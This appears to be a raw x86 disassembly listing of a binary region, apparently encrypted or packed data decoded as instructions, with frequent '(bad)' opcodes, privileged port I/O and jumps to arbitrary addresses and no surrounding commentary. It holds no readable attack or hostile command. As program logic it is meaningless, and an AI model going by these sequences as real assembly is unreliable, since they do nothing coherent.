  419c8f:	jmp    0x419c74
  419c91:	bound  ecx,QWORD PTR [edx]
  419c93:	dec    eax
  419c94:	xor    BYTE PTR [ecx],bl
  419c96:	bound  edi,QWORD PTR [ebx]
  419c98:	ffree  st(1)
  419c9a:	mov    ebx,0x7da88f4e
  419c9f:	cdq    
  419ca0:	mov    bh,0x46
  419ca2:	fcom   DWORD PTR [edx+0x73]
  419ca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ca6:	iret   
  419ca7:	ins    BYTE PTR es:[edi],dx
  419ca8:	or     DWORD PTR [eax+0x5fb5175a],ebx
  419cae:	mov    ch,0x6e
  419cb0:	mov    al,0x11
  419cb2:	xor    dh,BYTE PTR [edx-0x514adb0c]
  419cb8:	imul   edx,DWORD PTR [edi],0x9fa98355
  419cbe:	daa    
  419cbf:	push   ebx
  419cc0:	mov    ebp,ebp
  419cc2:	stos   BYTE PTR es:[edi],al
  419cc3:	lods   eax,DWORD PTR ds:[esi]
  419cc4:	rcl    DWORD PTR [eax+0x47],cl
  419cc7:	or     edx,esp
  419cc9:	cdq    
  419cca:	xor    eax,DWORD PTR [esi+edi*2]
  419ccd:	xor    al,0x8f
  419ccf:	imul   ebp,DWORD PTR [edi],0x5978b302
  419cd5:	or     eax,0x59d14513
  419cda:	mov    ?,WORD PTR [esi+0x1ea98191]
  419ce0:	(bad)  
  419ce2:	in     al,dx
  419ce3:	fdiv   DWORD PTR [edi-0x6bc878c0]
  419ce9:	in     al,0x14
  419ceb:	sub    DWORD PTR [ecx-0x4bc0bdde],ebp
  419cf1:	xchg   DWORD PTR [edi-0x58f010dc],ebx
  419cf7:	in     eax,0x65
  419cf9:	xchg   ebp,eax
  419cfa:	ins    BYTE PTR es:[edi],dx
  419cfb:	mov    esp,esp
  419cfd:	pop    ebx
  419cfe:	in     al,dx
  419cff:	stc    
  419d00:	pop    ecx
  419d01:	js     0x419c87
  419d03:	ds jne 0x419d1b
  419d06:	adc    eax,0x66e02170
  419d0b:	aas    
  419d0c:	pop    esi
  419d0d:	push   0xaeb6a0da
  419d12:	popa   
  419d13:	retf   0xb3d9
  419d16:	out    dx,al
  419d17:	jno    0x419d0b
  419d19:	rcl    BYTE PTR [eax-0x1],1
  419d1c:	adc    dl,BYTE PTR [esi-0x1c43572a]
  419d22:	pushf  
  419d23:	shl    DWORD PTR [ebx-0x513e2e62],cl
  419d29:	outs   dx,DWORD PTR ds:[esi]
  419d2a:	std    
  419d2b:	add    al,0xa1
  419d2d:	xchg   edx,eax
  419d2e:	pop    esp
  419d2f:	daa    
  419d30:	mov    eax,ds:0xc01cceb6
  419d35:	lds    ecx,FWORD PTR [ecx]
  419d37:	jb     0x419d59
  419d39:	out    dx,eax
  419d3a:	pop    es
  419d3b:	out    0xf1,al
  419d3d:	cmc    
  419d3e:	sub    esi,ebp
  419d40:	test   al,0x9f
  419d42:	ins    BYTE PTR es:[edi],dx
  419d43:	push   cs
  419d44:	lahf   
  419d45:	ss mov ah,0xee
  419d48:	adc    eax,0xe4ed11ee
  419d4d:	inc    edx
  419d4e:	enter  0xc7e6,0xe8
  419d52:	mov    esp,0x5ca57abe
  419d57:	ss ds pusha 
  419d5a:	pop    es
  419d5b:	test   al,0xfb
  419d5d:	js     0x419d81
  419d5f:	push   ebx
  419d60:	pop    esi
  419d61:	rcr    DWORD PTR [ebp+0x30cf6f4f],0x66
  419d68:	mov    dh,0x71
  419d6a:	xor    DWORD PTR [edx-0x667eb0f2],0x34
  419d71:	test   eax,0x5fcad58b
  419d76:	fisubr WORD PTR [ecx-0x7341de82]
  419d7c:	nop
  419d7d:	out    0x14,al
  419d7f:	out    dx,eax
  419d80:	mov    ds:0x80be350a,eax
  419d85:	xchg   BYTE PTR [esi+0x12],ah
  419d88:	xor    BYTE PTR [eax-0x2c34cccb],al
  419d8e:	and    BYTE PTR [ebx-0x62],dl
  419d91:	aam    0x13
  419d93:	inc    edi
  419d94:	push   edx
  419d95:	jmp    0x9ee1:0x49952353
  419d9c:	xchg   ecx,eax
  419d9d:	jecxz  0x419de4
  419d9f:	mov    bl,0xf9
  419da1:	int    0x65
  419da3:	rcl    DWORD PTR [ebx+0x776f46bc],1
  419da9:	shl    BYTE PTR [esi+0x54e99780],1
  419daf:	test   edx,ecx
  419db1:	hlt    
  419db2:	retf   
  419db3:	into   
  419db4:	jae    0x419e24
  419db6:	outs   dx,BYTE PTR es:[esi]
  419db8:	dec    esp
  419db9:	pusha  
  419dba:	sahf   
  419dbb:	repz jae 0x419d4f
  419dbe:	inc    DWORD PTR [ebx+0x1a]
  419dc1:	jns    0x419dbe
  419dc3:	inc    ebp
  419dc4:	sbb    DWORD PTR [edi+0x1c],0x5
  419dc8:	mov    ebx,0xf853943a
  419dcd:	lea    edi,[ecx+esi*1]
  419dd0:	dec    eax
  419dd1:	xlat   BYTE PTR ds:[ebx]
  419dd2:	and    DWORD PTR [edi-0x6a8a242f],eax
  419dd8:	pop    ds
  419dd9:	xor    DWORD PTR [eax],eax
  419ddb:	mov    dl,0xc1
  419ddd:	xchg   esp,eax
  419dde:	push   cs
  419ddf:	dec    ecx
  419de0:	mov    ch,0x98
  419de2:	xchg   ebp,eax
  419de3:	enter  0x365e,0x4b
  419de7:	cmp    ebp,DWORD PTR [edi-0x4b]
  419dea:	add    eax,0xc1dbc5aa
  419def:	cmc    
  419df0:	arpl   WORD PTR [edx+0x2b9453ef],cx
  419df6:	add    al,0x65
  419df8:	inc    edi
  419df9:	mov    ds:0x701dc00a,eax
  419dfe:	mov    ds:0xcbeece6b,eax
  419e03:	fdivrp st(2),st
  419e05:	push   ecx
  419e06:	out    0x63,al
  419e08:	mov    ah,BYTE PTR [edi+0x7e]
  419e0b:	sbb    eax,0x4319ef6e
  419e10:	enter  0x869f,0xfc
  419e14:	pop    esp
  419e15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e16:	outs   dx,BYTE PTR ds:[esi]
  419e17:	sahf   
  419e18:	mov    eax,?
  419e1a:	cld    
  419e1b:	iret   
  419e1c:	pop    esi
  419e1d:	pop    ecx
  419e1e:	dec    edi
  419e1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e20:	jg     0x419dd4
  419e22:	adc    ebp,DWORD PTR [ebx+0x5]
  419e25:	push   0x73856a5c
  419e2a:	mov    esp,ecx
  419e2c:	mov    cs,eax
  419e2e:	jne    0x419dff
  419e30:	aas    
  419e31:	dec    eax
  419e32:	xor    ebx,DWORD PTR [ebp+0x2b]
  419e35:	(bad)  
  419e36:	mov    WORD PTR [eax-0x1e72e2e6],?
  419e3c:	icebp  
  419e3d:	sti    
  419e3e:	pop    esi
  419e3f:	fnstenv [edi]
  419e41:	fadd   QWORD PTR [eax+0xf07d0d]
  419e47:	ss pop eax
  419e49:	stos   DWORD PTR es:[edi],eax
  419e4a:	repnz mov bh,0xf0
  419e4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e4e:	cmp    ch,BYTE PTR [ebx-0x15d78a52]
  419e54:	ret    0x542b
  419e57:	mov    esi,0xc44e6654
  419e5c:	push   ebp
  419e5d:	cs jmp 0x419ed3
  419e60:	pop    ebx
  419e61:	mov    esi,0x992aaf28
  419e66:	mov    WORD PTR [ebp-0x45],cs
  419e69:	mov    bh,0x34
  419e6b:	js     0x419e24
  419e6d:	ins    DWORD PTR es:[edi],dx
  419e6e:	push   es
  419e6f:	push   esi
  419e70:	(bad)  
  419e71:	(bad)  
  419e72:	mov    ecx,0xfb23ad5
  419e77:	(bad)  
  419e78:	loopne 0x419e3b
  419e7a:	or     eax,0xdf55cd84
  419e7f:	cmp    BYTE PTR [edi+ecx*4],bh
  419e82:	out    dx,eax
  419e83:	in     al,0x7b
  419e85:	pop    edi
  419e86:	inc    edi
  419e87:	or     dl,BYTE PTR [eax]
  419e89:	mov    ds:0x1c91a10a,al
  419e8e:	mov    ah,0xe0
  419e90:	xchg   ebp,eax
  419e91:	inc    eax
  419e92:	sahf   
  419e93:	xor    BYTE PTR [eax-0xd],bl
  419e96:	pusha  
  419e97:	mov    esi,0xbbc7c4d7
  419e9c:	cmp    al,0xac
  419e9e:	push   0x6d82a2b8
  419ea3:	mov    al,0x54
  419ea5:	adc    eax,0x7db5b36e
  419eaa:	jnp    0x419ee0
  419eac:	push   ebp
  419ead:	mov    ecx,0x5bd9970
  419eb2:	mov    al,0x20
  419eb4:	jge    0x419ecd
  419eb6:	rol    DWORD PTR [edx-0x15f4bb82],1
  419ebc:	inc    esp
  419ebd:	int    0x51
  419ebf:	jge    0x419f1b
  419ec1:	iret   
  419ec2:	add    eax,0x4c913ee2
  419ec7:	std    
  419ec8:	addr16 cli 
  419eca:	loope  0x419ecf
  419ecc:	ret    0xad21
  419ecf:	mov    ecx,0x79369901
  419ed4:	mov    esi,0x1b83dd4c
  419ed9:	and    eax,0x8b88f0a0
  419ede:	call   0x621f:0xe8b9e1e7
  419ee5:	call   0xc3403771
  419eea:	movlps QWORD PTR [ecx-0x8],xmm2
  419eee:	(bad)
  419ef1:	arpl   bx,si
  419ef3:	push   0x32273c8e
  419ef8:	push   esp
  419ef9:	cmp    edi,DWORD PTR [esi+0x5e]
  419efc:	retf   0xfce0
  419eff:	add    BYTE PTR [edx+0x39],cl
  419f02:	shl    BYTE PTR [ebx],cl
  419f04:	mov    al,ds:0x9340bb91
  419f09:	data16 std 
  419f0b:	sub    al,0x63
  419f0e:	inc    edi
  419f0f:	xor    BYTE PTR [ebp+0xa],0xd3
  419f13:	jo     0x419f3a
  419f15:	daa    
  419f16:	loop   0x419ead
  419f18:	test   al,0x4d
  419f1a:	clc    
  419f1b:	xchg   dx,ax
  419f1d:	jl     0x419ed7
  419f1f:	fiadd  DWORD PTR [eax+ecx*8-0x50]
  419f23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f24:	sub    ebx,DWORD PTR [edi-0x7618609a]
  419f2a:	fisubr WORD PTR [esi+eax*8]
  419f2d:	jnp    0x419ed9
  419f2f:	ds jg  0x419f12
  419f32:	jmp    0x2d421919
  419f37:	mov    BYTE PTR [eax],dh
  419f39:	call   0x9a08c7d8
  419f3e:	jl     0x419f09
  419f40:	imul   eax,DWORD PTR [eax+ebx*4],0x6a
  419f44:	ins    DWORD PTR es:[edi],dx
  419f45:	mov    edi,DWORD PTR ds:0xaf15629d
  419f4b:	ss mov eax,0x5d80351e
  419f51:	add    eax,DWORD PTR [edi]
  419f53:	pop    eax
  419f54:	cmp    eax,0xf33a9527
  419f59:	push   0xa28d194b
  419f5e:	int    0xde
  419f60:	mov    ebx,0x73c9e535
  419f65:	adc    DWORD PTR [edx],0xce553456
  419f6b:	rcl    BYTE PTR [ebx-0xa1554e4],1
  419f71:	pop    ss
  419f72:	popa   
  419f73:	mov    ch,0x1b
  419f75:	stos   BYTE PTR es:[edi],al
  419f76:	push   ebx
  419f77:	sbb    BYTE PTR [edi-0x49],ch
  419f7a:	iret   
  419f7b:	retf   
  419f7c:	cmp    esp,DWORD PTR [esi+0x2824195c]
  419f82:	cli    
  419f83:	inc    ecx
  419f84:	lahf   
  419f85:	popf   
  419f86:	push   ss
  419f87:	out    dx,al
  419f88:	scas   eax,DWORD PTR es:[edi]
  419f89:	xchg   ecx,eax
  419f8a:	jge    0x419f5d
  419f8c:	xlat   BYTE PTR ds:[ebx]
  419f8d:	(bad)  
  419f8e:	push   cs
  419f8f:	stc    
  419f90:	sbb    DWORD PTR [ebx],esp
  419f92:	xchg   esp,eax
  419f93:	jb     0x419ff3
  419f95:	push   cs
  419f96:	fld    DWORD PTR [ebp+0x2f9b8b9a]
  419f9c:	mov    ch,bl
  419f9e:	ret    
  419f9f:	shl    DWORD PTR [edx],cl
  419fa1:	or     eax,DWORD PTR [eax-0x44]
  419fa4:	ret    
  419fa5:	push   ecx
  419fa6:	jbe    0x41a00b
  419fa8:	imul   esi,DWORD PTR [ecx+eiz*2],0x5
  419fac:	cmp    bl,BYTE PTR [ebx-0x41]
  419faf:	adc    BYTE PTR [ecx+0x3174d752],0xb8
  419fb6:	imul   edx,ecx,0xa1ff94c0
  419fbc:	adc    DWORD PTR [eax+0x2903267a],edi
  419fc2:	mov    ds:0xd2e51b5e,al
  419fc7:	cmp    BYTE PTR [edx],0x1c
  419fca:	shl    DWORD PTR [edi],0x6a
  419fcd:	pop    esi
  419fce:	mov    ch,0xde
  419fd0:	and    bl,BYTE PTR [eax]
  419fd2:	lock mov cx,0x22de
  419fd7:	cdq    
  419fd8:	cs push esi
  419fda:	adc    DWORD PTR [edi],ecx
  419fdc:	test   cl,bl
  419fde:	lock mov eax,ds:0x505b86cb
  419fe4:	jle    0x419ff4
  419fe6:	mov    dl,bl
  419fe8:	imul   esp,DWORD PTR [edi],0xfd88c8b5
  419fee:	cmc    
  419fef:	mov    ds:0xc11bbedf,eax
  419ff4:	daa    
  419ff5:	inc    ecx
  419ff6:	push   ds
  419ff7:	pop    ecx
  419ff8:	fisub  DWORD PTR [edi]
  419ffa:	xor    al,0x6c
  419ffc:	pop    ebx
  419ffd:	daa    
  419ffe:	idiv   DWORD PTR [eax-0x424fa3a5]
  41a004:	pop    edi
  41a005:	cld    
  41a006:	fs cwde 
  41a008:	lods   al,BYTE PTR ds:[esi]
  41a009:	add    al,BYTE PTR [esp+eiz*4+0x1ba4f4e8]
  41a010:	inc    edx
  41a011:	jbe    0x41a04c
  41a013:	mov    bl,BYTE PTR [ebx-0x4ea55aac]
  41a019:	mov    edx,0x249683c
  41a01e:	jb     0x41a070
  41a020:	cmp    esi,DWORD PTR [eax+0x58]
  41a023:	lds    esi,FWORD PTR [ecx+0x7c8b558]
  41a029:	test   esi,0xe7fbd39f
  41a02f:	xlat   BYTE PTR ds:[ebx]
  41a030:	push   ss
  41a031:	push   es
  41a032:	aas    
  41a033:	push   ebp
  41a034:	arpl   di,bx
  41a036:	and    DWORD PTR [ebp-0x73],esp
  41a039:	fwait
  41a03a:	test   DWORD PTR [edi-0xe],ebp
  41a03d:	sti    
  41a03e:	add    ecx,DWORD PTR es:[eax-0x2b23b33c]
  41a045:	jecxz  0x41a03b
  41a047:	aam    0xfc
  41a049:	lods   al,BYTE PTR ds:[esi]
  41a04a:	repz mov edx,0x4bcc17b7
  41a050:	sbb    DWORD PTR [ebx],edx
  41a052:	jmp    0x419fe0
  41a054:	or     al,0xf
  41a056:	cs push edx
  41a058:	(bad)  
  41a059:	pop    edx
  41a05a:	rcr    BYTE PTR [eax],1
  41a05c:	xor    ebx,DWORD PTR [ebx-0x66]
  41a05f:	int    0x8b
  41a061:	ficomp DWORD PTR [ecx+0x66561853]
  41a067:	jb     0x41a080
  41a069:	popa   
  41a06a:	je     0x41a042
  41a06c:	push   eax
  41a06d:	and    esi,ebp
  41a06f:	xchg   edx,eax
  41a070:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a071:	outs   dx,DWORD PTR ds:[esi]
  41a072:	imul   eax,DWORD PTR [ecx+0x49e6d0fd],0xe7835853
  41a07c:	sti    
  41a07d:	ret    
  41a07e:	imul   edx,DWORD PTR [ecx+0x9f5aaaa],0x6c4cc5b9
  41a088:	mov    esp,0x7f86cca
  41a08d:	frstor [edx]
  41a08f:	xchg   ecx,eax
  41a090:	jne    0x41a045
  41a092:	mov    al,ds:0x26af1cb3
  41a097:	retf   
  41a098:	pusha  
  41a099:	cld    
  41a09a:	das    
  41a09b:	loopne 0x41a075
  41a09d:	mov    eax,0x8a3439df
  41a0a2:	add    eax,DWORD PTR [edi+0x44eac8de]
  41a0a8:	pop    es
  41a0a9:	pop    ecx
  41a0aa:	jle    0x41a102
  41a0ac:	hlt    
  41a0ad:	les    esp,FWORD PTR [ebx]
  41a0af:	and    al,0x26
  41a0b1:	stos   BYTE PTR es:[edi],al
  41a0b2:	inc    esp
  41a0b3:	xor    WORD PTR [ebx],cx
  41a0b6:	inc    edx
  41a0b7:	sbb    ebx,ebx
  41a0b9:	call   0x3171:0xbe9b7ac1
  41a0c0:	add    BYTE PTR [eax+edx*2-0x76],ah
  41a0c4:	mov    cl,0x91
  41a0c6:	rep lods eax,DWORD PTR ds:[esi]
  41a0c8:	fcom   QWORD PTR [edx+0x2c97620]
  41a0ce:	ins    BYTE PTR es:[edi],dx
  41a0cf:	add    al,0x49
  41a0d1:	inc    ebp
  41a0d2:	sbb    eax,edx
  41a0d4:	add    eax,0x8ccbeeb9
  41a0d9:	sar    bl,cl
  41a0db:	sub    bl,ah
  41a0dd:	sub    al,0xb7
  41a0df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0e0:	pop    esi
  41a0e1:	sub    eax,0x52aef94c
  41a0e6:	sahf   
  41a0e7:	fidivr WORD PTR [ecx+edi*2]
  41a0ea:	test   al,0x1e
  41a0ec:	sbb    BYTE PTR [ecx],bl
  41a0ee:	xchg   BYTE PTR [ebp-0x7e86398d],dl
  41a0f4:	pop    ss
  41a0f5:	pop    eax
  41a0f6:	mov    esp,0x471be67e
  41a0fb:	xchg   ebp,eax
  41a0fc:	adc    DWORD PTR [ecx],0x426f0e57
  41a102:	xlat   BYTE PTR ds:[ebx]
  41a103:	(bad)  
  41a104:	hlt    
  41a105:	sahf   
  41a106:	pop    ecx
  41a107:	push   esp
  41a108:	sub    DWORD PTR [ebp+0x41d30cce],ebp
  41a10e:	fcmovbe st,st(1)
  41a110:	pop    edi
  41a111:	jae    0x41a166
  41a113:	stos   DWORD PTR es:[edi],eax
  41a114:	cmp    DWORD PTR ds:0x144df299,0xa51e1e4f
  41a11e:	mov    ebx,0x8ae01371
  41a123:	push   ecx
  41a124:	jne    0x41a125
  41a126:	xchg   ecx,eax
  41a127:	xchg   DWORD PTR fs:[ecx-0x2eb2a35f],edx
  41a12e:	arpl   si,cx
  41a130:	icebp  
  41a131:	sti    
  41a132:	(bad)  
  41a133:	push   ecx
  41a134:	mov    dl,0xe1
  41a136:	jmp    0x41a16e
  41a138:	ds leave 
  41a13a:	mov    bh,0x5e
  41a13c:	xlat   BYTE PTR ds:[ebx]
  41a13d:	frstor [edi+0x7d58136e]
  41a143:	(bad)  
  41a145:	(bad)  
  41a146:	jle    0x41a0d7
  41a148:	adc    cl,dl
  41a14a:	jle    0x41a166
  41a14c:	jnp    0x41a191
  41a14e:	mov    edi,0x89db2cd9
  41a153:	xchg   ebx,eax
  41a154:	int3   
  41a155:	pop    esp
  41a156:	aam    0x0
  41a158:	ret    0x45b7
  41a15b:	pop    esp
  41a15c:	call   0xb86b6e61
  41a161:	rcl    DWORD PTR [edx+0x4802fe43],1
  41a167:	imul   edx,edi,0x3b
  41a16a:	push   ss
  41a16b:	icebp  
  41a16c:	out    0x85,eax
  41a16e:	daa    
  41a16f:	mov    bl,0x70
  41a171:	cs arpl ax,bx
  41a174:	cdq    
  41a175:	std    
  41a176:	xchg   ecx,eax
  41a177:	mov    esp,esi
  41a179:	dec    esi
  41a17a:	jmp    0xaa6f22fa
  41a17f:	adc    ebx,ebp
  41a181:	pushw  0x5b
  41a184:	jbe    0x41a1eb
  41a186:	retf   0x50b0
  41a189:	rcr    BYTE PTR [ebp+eiz*8-0x32],cl
  41a18d:	jle    0x41a138
  41a18f:	mov    edx,0xdcbe191e
  41a194:	loopne 0x41a133
  41a196:	jno    0x41a148
  41a198:	push   edi
  41a199:	hlt    
  41a19a:	jmp    0x79ac:0xd97d95fa
  41a1a1:	adc    eax,0xec1b4cb5
  41a1a6:	out    dx,eax
  41a1a7:	cmp    BYTE PTR [ecx+0x17ba114],bl
  41a1ad:	cdq    
  41a1ae:	jge    0x41a164
  41a1b0:	xor    DWORD PTR [esi],edi
  41a1b2:	push   ss
  41a1b3:	cdq    
  41a1b4:	push   ss
  41a1b5:	int3   
  41a1b6:	jecxz  0x41a16b
  41a1b8:	and    DWORD PTR [edx-0x4d194758],ebp
  41a1be:	mov    edi,0x4150c8d3
  41a1c3:	mov    esp,fs
  41a1c5:	dec    ebx
  41a1c6:	dec    esi
  41a1c7:	fdivp  st(4),st
  41a1c9:	add    ecx,0x31
  41a1cc:	pop    ebx
  41a1cd:	sbb    BYTE PTR [eax+0x60848f92],dl
  41a1d3:	lea    esi,[ebx+0x70]
  41a1d6:	mov    esi,DWORD PTR [edi]
  41a1d8:	pop    ebx
  41a1d9:	nop
  41a1da:	test   DWORD PTR [ebp-0x36],edi
  41a1dd:	(bad)  
  41a1de:	cld    
  41a1df:	sub    ebx,DWORD PTR [ebx]
  41a1e1:	cli    
  41a1e2:	(bad)
  41a1e5:	add    edx,ebp
  41a1e7:	push   ecx
  41a1e8:	mov    eax,0x9cc88eb1
  41a1ed:	xor    al,0xea
  41a1ef:	std    
  41a1f0:	shr    DWORD PTR [edi+edi*1],cl
  41a1f3:	lods   eax,DWORD PTR es:[esi]
  41a1f5:	sbb    ebp,DWORD PTR [esi+0x3]
  41a1f8:	(bad)  [edx]
  41a1fa:	in     al,dx
  41a1fb:	fcomp  DWORD PTR [edi-0x4c]
  41a1fe:	or     al,0xe5
  41a200:	pusha  
  41a201:	mov    ebx,0x423f929e
  41a206:	pop    ebp
  41a207:	in     al,dx
  41a208:	fmul   DWORD PTR [eax-0x5a33a601]
  41a20e:	xlat   BYTE PTR ds:[ebx]
  41a20f:	dec    ecx
  41a210:	int3   
  41a211:	sbb    al,0x28
  41a213:	sub    esi,edi
  41a215:	seta   bh
  41a218:	mov    ds:0x6b3301d6,al
  41a21d:	pop    ebx
  41a21e:	xchg   ebx,eax
  41a21f:	fcomp  DWORD PTR [edi+eiz*2-0x52353c57]
  41a226:	test   DWORD PTR [eax-0x126584c0],0x95e27ce2
  41a230:	push   ebx
  41a231:	inc    ecx
  41a232:	out    dx,al
  41a233:	out    0xcd,al
  41a235:	stc    
  41a236:	loop   0x41a294
  41a238:	adc    ax,0x85fe
  41a23c:	inc    esp
  41a23d:	lods   eax,DWORD PTR ds:[esi]
  41a23e:	loop   0x41a26a
  41a240:	mov    ebp,0x43cec1ff
  41a245:	fsub   QWORD PTR [ebx+0x3c5bb6d0]
  41a24b:	jne    0x41a211
  41a24d:	std    
  41a24e:	push   esi
  41a24f:	sbb    al,0xee
  41a251:	push   ds
  41a252:	push   eax
  41a253:	pop    ss
  41a254:	test   BYTE PTR [edi+ecx*2],bl
  41a257:	sbb    edx,DWORD PTR ds:0x4de316f3
  41a25d:	xor    DWORD PTR [ecx],edi
  41a25f:	fcomp  DWORD PTR [esi-0x31]
  41a262:	repz inc di
  41a265:	into   
  41a266:	aad    0x8b
  41a268:	daa    
  41a269:	xlat   BYTE PTR ds:[ebx]
  41a26a:	js     0x41a2cc
  41a26c:	xchg   edx,eax
  41a26d:	jmp    0x91461b02
  41a272:	xchg   BYTE PTR [edx+edi*2],dh
  41a275:	jno    0x41a295
  41a277:	pop    ebp
  41a278:	add    al,0xc9
  41a27a:	mov    al,ds:0x57bab4b0
  41a27f:	sbb    eax,0x685003a6
  41a284:	imul   esp,DWORD PTR [ebx-0x10],0x25
  41a288:	push   ss
  41a289:	test   ah,bl
  41a28b:	nop
  41a28c:	icebp  
  41a28d:	je     0x41a236
  41a28f:	mov    edi,0x1878293e
  41a294:	and    dl,BYTE PTR [ecx+esi*2+0x5c]
  41a298:	pushf  
  41a299:	pop    ecx
  41a29a:	pop    edi
  41a29b:	xchg   esi,eax
  41a29c:	jb     0x41a2b4
  41a29e:	dec    eax
  41a29f:	out    dx,eax
  41a2a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2a1:	add    ebx,DWORD PTR [ebp-0xe8a3ed8]
  41a2a7:	faddp  st(3),st
  41a2a9:	sub    al,0xd5
  41a2ab:	pop    es
  41a2ac:	jecxz  0x41a2f3
  41a2ae:	push   ebx
  41a2af:	and    al,0x79
  41a2b1:	add    al,0xe1
  41a2b3:	inc    ecx
  41a2b4:	jo     0x41a299
  41a2b6:	in     al,0x7b
  41a2b8:	loopne 0x41a2a9
  41a2ba:	jnp    0x41a2d5
  41a2bc:	iret   
  41a2bd:	xor    DWORD PTR [ebp-0xa08ff9d],0x999ee8c8
  41a2c7:	sbb    BYTE PTR [esi+0x65b1dcd6],cl
  41a2cd:	loopne 0x41a270
  41a2cf:	dec    ebp
  41a2d0:	fucom  st(3)
  41a2d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2d3:	aam    0x82
  41a2d5:	pop    edx
  41a2d6:	pop    ss
  41a2d7:	outs   dx,DWORD PTR ds:[esi]
  41a2d8:	and    ch,dh
  41a2da:	dec    ecx
  41a2db:	(bad)  
  41a2dc:	dec    ecx
  41a2dd:	inc    ecx
  41a2de:	dec    edx
  41a2df:	cmp    DWORD PTR [ebp-0x4c],esi
  41a2e2:	cmc    
  41a2e3:	adc    BYTE PTR [eax+0x392c4d0e],al
  41a2e9:	rcl    BYTE PTR [ecx+esi*4-0x4823c750],0xdb
  41a2f1:	inc    edx
  41a2f2:	mov    edx,0xfd3d0665
  41a2f7:	loop   0x41a36e
  41a2f9:	(bad)  
  41a2fb:	mov    dl,0xc2
  41a2fd:	add    BYTE PTR [edx+edx*4],0x14
  41a301:	in     eax,dx
  41a302:	pop    edi
  41a303:	js     0x41a289
  41a305:	ins    DWORD PTR es:[edi],dx
  41a306:	call   0xee1237c8
  41a30b:	cmp    al,0xb9
  41a30d:	push   edx
  41a30e:	cmp    al,0xe2
  41a310:	adc    eax,0xb268056a
  41a315:	sbb    eax,DWORD PTR [eax]
  41a317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a318:	je     0x41a35d
  41a31a:	jnp    0x41a38e
  41a31c:	and    esi,ebx
  41a31e:	push   ecx
  41a31f:	imul   esp,DWORD PTR [esi-0x3bfc69e5],0x19
  41a326:	fadd   DWORD PTR [ebp-0x3753d57]
  41a32c:	icebp  
  41a32d:	jo     0x41a2fc
  41a32f:	sbb    DWORD PTR ds:0x3e35e231,ecx
  41a335:	clc    
  41a336:	call   0x51b42dd
  41a33b:	in     eax,dx
  41a33c:	push   esi
  41a33d:	(bad)  
  41a33e:	cli    
  41a33f:	push   ecx
  41a340:	mov    ebx,0x74f188df
  41a345:	pop    ebp
  41a346:	data16 jge 0x41a2d2
  41a349:	sub    BYTE PTR [esi],cl
  41a34b:	and    DWORD PTR [esp+edx*8+0x35],esp
  41a34f:	std    
  41a350:	(bad)  
  41a351:	mov    esi,0x4a21a513
  41a356:	adc    eax,0xcf14d955
  41a35b:	sti    
  41a35c:	ror    BYTE PTR [edi],0x43
  41a35f:	dec    ebp
  41a360:	loope  0x41a3c7
  41a362:	gs mov cl,dl
  41a365:	mov    bh,0x2b
  41a367:	adc    al,0x97
  41a369:	xor    BYTE PTR [ebx-0x6c],ch
  41a36c:	mov    ebx,DWORD PTR [esi-0x67]
  41a36f:	jbe    0x41a35c
  41a371:	stos   BYTE PTR es:[edi],al
  41a372:	and    dl,bl
  41a374:	rcl    BYTE PTR [ecx-0x19],0x67
  41a378:	xor    bl,BYTE PTR [edx-0x49]
  41a37b:	sub    BYTE PTR [edi+0xd665165],bh
  41a381:	mov    eax,es
  41a383:	daa    
  41a384:	ja     0x41a393
  41a386:	ins    DWORD PTR es:[edi],dx
  41a387:	xor    esp,DWORD PTR [edi-0x727911d5]
  41a38d:	not    DWORD PTR [ebp+0x22]
  41a390:	stc    
  41a391:	push   esp
  41a392:	stos   BYTE PTR es:[edi],al
  41a393:	jns    0x41a40c
  41a395:	jecxz  0x41a387
  41a397:	mov    esi,0xbc250f5
  41a39c:	sub    al,0xaa
  41a39e:	push   esp
  41a39f:	jne    0x41a3f5
  41a3a1:	cli    
  41a3a2:	mov    edx,0x1ff7ae1
  41a3a7:	pop    ebp
  41a3a8:	cdq    
  41a3a9:	gs (bad) 
  41a3ab:	shl    BYTE PTR [ecx-0x452dc034],cl
  41a3b1:	cli    
  41a3b2:	push   gs
  41a3b4:	mov    esp,0x8eba36e3
  41a3b9:	push   esi
  41a3ba:	cmp    eax,0x123cfe12
  41a3bf:	nop
  41a3c0:	push   edi
  41a3c1:	pop    ecx
  41a3c3:	add    edi,DWORD PTR [ecx-0x29b609cc]
  41a3c9:	dec    edx
  41a3ca:	push   esp
  41a3cb:	dec    esi
  41a3cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3cd:	mov    al,0x8
  41a3cf:	dec    ebx
  41a3d0:	popa   
  41a3d1:	sub    ch,BYTE PTR [edi+ecx*8-0x29]
  41a3d5:	jbe    0x41a445
  41a3d7:	retf   
  41a3d8:	ins    BYTE PTR es:[edi],dx
  41a3d9:	fs mov ah,0xd7
  41a3dc:	fidiv  WORD PTR [ecx+0x490f709e]
  41a3e2:	mov    ch,0x85
  41a3e4:	(bad)  
  41a3e5:	sbb    al,0x61
  41a3e7:	mov    cl,bl
  41a3e9:	fwait
  41a3ea:	pop    edx
  41a3eb:	lea    eax,ds:0x535f582a
  41a3f1:	cld    
  41a3f2:	push   ds
  41a3f3:	xlat   BYTE PTR ds:[ebx]
  41a3f4:	lahf   
  41a3f5:	sbb    al,0xd9
  41a3f7:	adc    DWORD PTR [ebp+0x7d],0xffffffcf
  41a3fb:	ds jecxz 0x41a42c
  41a3fe:	and    bh,0xd4
  41a401:	and    DWORD PTR [edi+0x57],esp
  41a404:	or     BYTE PTR [ecx],dh
  41a406:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a407:	adc    ebp,DWORD PTR [edi+ecx*8-0x1de44362]
  41a40e:	jno    0x41a3b3
  41a410:	cmp    eax,0x35b15bf3
  41a415:	pop    esp
  41a416:	in     eax,0xbe
  41a418:	shr    BYTE PTR [esi-0x209dbcf5],0x4
  41a41f:	sub    al,0x60
  41a421:	mov    dh,0xe9
  41a423:	dec    eax
  41a424:	daa    
